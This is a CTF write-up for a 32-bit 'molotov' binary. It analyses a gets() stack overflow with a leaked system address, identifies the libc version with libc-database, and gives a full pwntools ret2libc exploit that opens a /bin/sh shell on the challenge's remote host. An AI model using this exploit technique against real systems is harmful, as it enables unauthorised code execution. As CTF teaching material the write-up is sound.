## Summary

Beginner BOF with `system` leaked, however user must find libc version themselves.


## Analysis

### Checksec

```
    Arch:     i386-32-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

Most mitigations in place, however no stack canary; BOF -> ROP.

    
### Decompile with Ghidra

```c
undefined4 vuln(void)
{
  char local_20 [24];
  
  printf("%x\n",system);
  puts("Input : ");
  gets(local_20);
  return 0;
}
```

Not a lot here; `system` address leaked with `gets` vulnerability.  `local_20` is `0x20` bytes from the return address on the stack.  Basic BOF.

Without knowing the version of libc we cannot pass the location of `/bin/sh` to `system`;  identifying that however is simple with [libc-database](https://github.com/niklasb/libc-database):

```
# nc 54.210.217.206 1240
f7de68b0
Input :
```

Take the last 3 nibbles and pass to `./find`:

```
# ./find system 8b0 | grep _i386
archive-glibc (id libc6_2.30-0ubuntu2.1_i386)
ubuntu-eoan-i386-libc6 (id libc6_2.30-0ubuntu2.2_i386)
http://ftp.osuosl.org/pub/ubuntu/pool/main/g/glibc/libc6_2.30-0ubuntu2_i386.deb (id libc6_2.30-0ubuntu2_i386)
```

Multiple hits.  I went with `libc6_2.30-0ubuntu2_i386` and it worked out just fine.  If it had failed, then there was only two other options to try.


### Exploit

This code assumes that `libc-database` is located in the same directory (I just sym linked it) as `exploit.py`.

From within the `libc-database` type:

```
# ./download libc6_2.30-0ubuntu2_i386
```

This will download libc, ld, et al.

Exploit Setup:

```python
#!/usr/bin/env python3

from pwn import *

binary = context.binary = ELF('./molotov')
context.log_level = 'INFO'
context.log_file = 'log.log'

'''
# local libc
libc = binary.libc
p = process(binary.path)
'''
# task libc
libid = 'libc6_2.30-0ubuntu2_i386'
libpath = os.getcwd() + '/libc-database/libs/' + libid + '/'
ld = ELF(libpath + 'ld-2.30.so')
libc = ELF(libpath + 'libc-2.30.so')
#p = process([ld.path, binary.path], env={'LD_LIBRARY_PATH': libpath})
p = remote('54.210.217.206', 1240)
#'''
```

The first few lines should not require much of an explanation, except perhaps the `binary = context.binary = ELF('./molotov')` statement.  The `context.binary` there in the middle will set the context (arch, os, etc...) so that `rop`, `asm`, `constants`, etc... statements produce the correct results.

The next section (selected by placing `#` at the first or last `'''`) determines if you want to use your local libc or the challenge libc.  For most easy challenges I dev/test with the local libc and then just test with the task libc.  However for some, esp. when pulling addresses from the stack, I've found inconsistencies between my local libc is vs the task libc.  Often time is wasted having to refactor or completely resolve for the task libc.  The second block handles launching a challenge binary with the intended libs.  And `gdb` works just fine with this as well.

Actual Exploit:

```python
_ = p.recvline()
system = int(_,16)
log.info('system: ' + hex(system))
libc.address = system - libc.sym.system
log.info('baselibc: ' + hex(libc.address))

payload  = 0x20 * b'A'
payload += p32(libc.sym.system)
payload += 4 * b'B'
payload += p32(libc.search(b'/bin/sh').__next__())

p.sendlineafter('Input : \n',payload)
p.interactive()
```

With the correct libc in hand, just capture the system address, compute the base of libc, then setup your ROP chain after padding with `0x20` bytes.
